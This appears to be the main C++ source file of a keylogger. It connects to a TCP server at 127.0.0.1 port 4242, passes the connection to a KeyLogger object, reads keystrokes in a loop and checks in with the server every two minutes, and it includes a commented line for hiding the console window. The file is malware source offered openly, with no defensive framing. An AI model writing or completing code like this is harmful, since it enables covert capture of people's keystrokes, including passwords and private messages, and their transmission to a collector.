#include <iostream>
#include <errno.h>
#include "TCPClient.hpp"
#include "KeyLoger.hpp"

#include <ctime>

int main(int argc, char **argv)
{
	TCPClient client;
	const int serverCheckDelay = 2*60;
	unsigned long timestamp;
	unsigned long chrono;

	client.connectToHost("127.0.0.1", "4242");
	client.unblockSocket();
	KeyLogger::getInstance().setTCPClient(&client);
	// ShowWindow(GetConsoleWindow(), SW_HIDE); // Uncomment to hide console
	timestamp = std::time(nullptr);
	while (KeyLogger::getInstance().refreshNonBlocking())
	{
		
		chrono = std::time(nullptr);
		if (chrono - timestamp >= serverCheckDelay) {
			KeyLogger::getInstance().checkServer();
			chrono = std::time(nullptr);
			timestamp = chrono;
		}
	}
	return 0;
}